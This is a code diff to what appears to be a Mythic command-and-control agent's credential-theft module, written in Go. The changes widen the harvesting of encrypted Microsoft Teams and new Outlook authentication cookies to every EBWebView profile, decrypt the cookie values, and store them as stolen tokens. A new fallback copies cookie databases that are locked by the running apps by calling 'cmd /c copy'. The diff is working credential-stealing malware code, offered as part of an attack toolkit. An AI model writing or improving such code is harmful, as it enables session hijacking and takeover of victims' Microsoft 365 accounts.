@@ -3,6 +3,7 @@
 package commands
 
 import (
+	"database/sql"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -145,6 +146,9 @@ func parseTbresFile(path string) ([]extractedToken, error) {
 		return nil, fmt.Errorf("UTF-16 decode: %w", err)
 	}
 
+	// Trim any remaining null characters (embedded or trailing) that break JSON parsing
+	jsonStr = strings.TrimRight(jsonStr, "\x00")
+
 	var obj tbresObject
 	if err := json.Unmarshal([]byte(jsonStr), &obj); err != nil {
 		return nil, fmt.Errorf("JSON parse: %w", err)
@@ -183,12 +187,12 @@ func parseTbresFile(path string) ([]extractedToken, error) {
 
 // ebWebViewApp defines an application that uses EBWebView for token storage
 type ebWebViewApp struct {
-	name        string
-	localState  string
-	cookiesPath string
+	name     string
+	basePath string // EBWebView root directory (contains Local State + profile dirs)
 }
 
-// credEBWebViewTokens extracts encrypted cookies from EBWebView-based M365 apps
+// credEBWebViewTokens extracts encrypted cookies from EBWebView-based M365 apps.
+// Scans all profile directories (Default, WV2Profile_tfw, etc.) not just Default.
 func credEBWebViewTokens(sb *strings.Builder) []structs.MythicCredential {
 	sb.WriteString("--- EBWebView Token Cookies ---\n")
 
@@ -200,14 +204,12 @@ func credEBWebViewTokens(sb *strings.Builder) []structs.MythicCredential {
 
 	apps := []ebWebViewApp{
 		{
-			name:        "Microsoft Teams",
-			localState:  filepath.Join(localAppData, "Packages", "MSTeams_8wekyb3d8bbwe", "LocalCache", "Microsoft", "MSTeams", "EBWebView", "Local State"),
-			cookiesPath: filepath.Join(localAppData, "Packages", "MSTeams_8wekyb3d8bbwe", "LocalCache", "Microsoft", "MSTeams", "EBWebView", "Default", "Network", "Cookies"),
+			name:     "Microsoft Teams",
+			basePath: filepath.Join(localAppData, "Packages", "MSTeams_8wekyb3d8bbwe", "LocalCache", "Microsoft", "MSTeams", "EBWebView"),
 		},
 		{
-			name:        "Outlook (New)",
-			localState:  filepath.Join(localAppData, "Microsoft", "Olk", "EBWebView", "Local State"),
-			cookiesPath: filepath.Join(localAppData, "Microsoft", "Olk", "EBWebView", "Default", "Network", "Cookies"),
+			name:     "Outlook (New)",
+			basePath: filepath.Join(localAppData, "Microsoft", "Olk", "EBWebView"),
 		},
 	}
 
@@ -222,45 +224,79 @@ func credEBWebViewTokens(sb *strings.Builder) []structs.MythicCredential {
 	return allCreds
 }
 
-// extractEBWebViewCookies extracts auth cookies from a single EBWebView app
+// extractEBWebViewCookies extracts auth cookies from all profiles within an EBWebView app.
+// EBWebView apps may store cookies in Default, WV2Profile_tfw, or other profile directories.
 func extractEBWebViewCookies(sb *strings.Builder, app ebWebViewApp) []structs.MythicCredential {
 	sb.WriteString(fmt.Sprintf("\n  [%s]\n", app.name))
 
-	// Check if the app exists
-	if _, err := os.Stat(app.localState); os.IsNotExist(err) {
+	// Check if the app's EBWebView directory exists
+	localStatePath := filepath.Join(app.basePath, "Local State")
+	if _, err := os.Stat(localStatePath); os.IsNotExist(err) {
 		sb.WriteString("    Not installed\n")
 		return nil
 	}
 
-	// Get the Local State directory (parent of Local State file)
-	localStateDir := filepath.Dir(app.localState)
-
 	// Get encryption key using existing browser infrastructure
-	key, err := getEncryptionKey(localStateDir)
+	key, err := getEncryptionKey(app.basePath)
 	if err != nil {
 		sb.WriteString(fmt.Sprintf("    Failed to get encryption key: %v\n", err))
 		return nil
 	}
 	defer structs.ZeroBytes(key)
 
-	// Check if cookies DB exists
-	if _, err := os.Stat(app.cookiesPath); os.IsNotExist(err) {
-		sb.WriteString("    No cookies database found\n")
+	// Discover all profile directories that contain a Cookies database
+	entries, err := os.ReadDir(app.basePath)
+	if err != nil {
+		sb.WriteString(fmt.Sprintf("    Failed to list profiles: %v\n", err))
 		return nil
 	}
 
-	// Open the cookies database using existing browser DB infrastructure
-	db, cleanup, err := openBrowserDB(app.cookiesPath)
+	var allCreds []structs.MythicCredential
+	for _, entry := range entries {
+		if !entry.IsDir() {
+			continue
+		}
+		// Check Network/Cookies (modern Chromium path)
+		cookiesPath := filepath.Join(app.basePath, entry.Name(), "Network", "Cookies")
+		if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
+			// Also check direct Cookies path (older layout)
+			cookiesPath = filepath.Join(app.basePath, entry.Name(), "Cookies")
+			if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
+				continue
+			}
+		}
+
+		creds := extractProfileCookies(sb, app.name, entry.Name(), cookiesPath, key)
+		allCreds = append(allCreds, creds...)
+	}
+
+	if len(allCreds) == 0 {
+		sb.WriteString("    No auth cookies found in any profile\n")
+	}
+	return allCreds
+}
+
+// extractProfileCookies extracts auth cookies from a single profile's cookies DB
+func extractProfileCookies(sb *strings.Builder, appName, profile, cookiesPath string, key []byte) []structs.MythicCredential {
+	sb.WriteString(fmt.Sprintf("    [Profile: %s]\n", profile))
+
+	// Open the cookies database — try openBrowserDB first, then cmd /c copy fallback
+	db, cleanup, err := openBrowserDB(cookiesPath)
 	if err != nil {
-		sb.WriteString(fmt.Sprintf("    Failed to open cookies DB: %v\n", err))
-		return nil
+		// EBWebView processes may hold exclusive locks that defeat both CreateFileW
+		// sharing and esentutl. Try cmd /c copy as a last resort.
+		db, cleanup, err = openDBViaCmdCopy(cookiesPath)
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("      Failed to open cookies DB: %v\n", err))
+			return nil
+		}
 	}
 	defer cleanup()
 
 	// Query all cookies — we'll filter for auth-relevant ones
 	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
 	if err != nil {
-		sb.WriteString(fmt.Sprintf("    Failed to query cookies: %v\n", err))
+		sb.WriteString(fmt.Sprintf("      Failed to query cookies: %v\n", err))
 		return nil
 	}
 	defer rows.Close()
@@ -293,7 +329,7 @@ func extractEBWebViewCookies(sb *strings.Builder, app ebWebViewApp) []structs.My
 		if len(encValue) > 0 {
 			value, err = decryptPassword(encValue, key)
 			if err != nil {
-				sb.WriteString(fmt.Sprintf("    [!] %s/%s: decrypt failed: %v\n", hostKey, name, err))
+				sb.WriteString(fmt.Sprintf("      [!] %s/%s: decrypt failed: %v\n", hostKey, name, err))
 				continue
 			}
 		}
@@ -307,25 +343,54 @@ func extractEBWebViewCookies(sb *strings.Builder, app ebWebViewApp) []structs.My
 		if len(display) > 100 {
 			display = display[:50] + "..." + display[len(display)-30:]
 		}
-		sb.WriteString(fmt.Sprintf("    [COOKIE] %s — %s (%s)\n", name, desc, hostKey))
-		sb.WriteString(fmt.Sprintf("      Value: %s\n", display))
+		sb.WriteString(fmt.Sprintf("      [COOKIE] %s — %s (%s)\n", name, desc, hostKey))
+		sb.WriteString(fmt.Sprintf("        Value: %s\n", display))
 
 		creds = append(creds, structs.MythicCredential{
 			CredentialType: "token",
 			Realm:          hostKey,
 			Account:        name,
 			Credential:     value,
-			Comment:        fmt.Sprintf("%s %s cookie", app.name, desc),
+			Comment:        fmt.Sprintf("%s %s cookie (%s)", appName, desc, profile),
 		})
 
 		structs.ZeroString(&value)
 	}
 	if err := rows.Err(); err != nil {
-		sb.WriteString(fmt.Sprintf("    Row iteration error: %v\n", err))
+		sb.WriteString(fmt.Sprintf("      Row iteration error: %v\n", err))
 	}
 
-	sb.WriteString(fmt.Sprintf("    Scanned %d cookies, found %d auth-related\n", totalCookies, authCookies))
+	sb.WriteString(fmt.Sprintf("      Scanned %d cookies, found %d auth-related\n", totalCookies, authCookies))
 	return creds
+}
+
+// openDBViaCmdCopy tries to open a locked SQLite DB by copying with cmd /c copy.
+// This uses a different code path than Go's CreateFileW and can sometimes bypass locks.
+func openDBViaCmdCopy(dbPath string) (*sql.DB, func(), error) {
+	tf, err := os.CreateTemp("", "ewcookies-*.db")
+	if err != nil {
+		return nil, func() {}, err
+	}
+	tmpFile := tf.Name()
+	tf.Close()
+
+	_, cmdErr := execCmdTimeout("cmd", "/c", "copy", "/y", dbPath, tmpFile)
+	if cmdErr != nil {
+		secureRemove(tmpFile)
+		return nil, func() {}, fmt.Errorf("DB locked by process (copy failed: %v)", cmdErr)
+	}
+
+	db, err := sql.Open("sqlite", tmpFile)
+	if err != nil {
+		secureRemove(tmpFile)
+		return nil, func() {}, err
+	}
+
+	cleanup := func() {
+		db.Close()
+		secureRemove(tmpFile)
+	}
+	return db, cleanup, nil
 }
 
 // credOneAuth enumerates OneAuth account metadata (not DPAPI-protected)
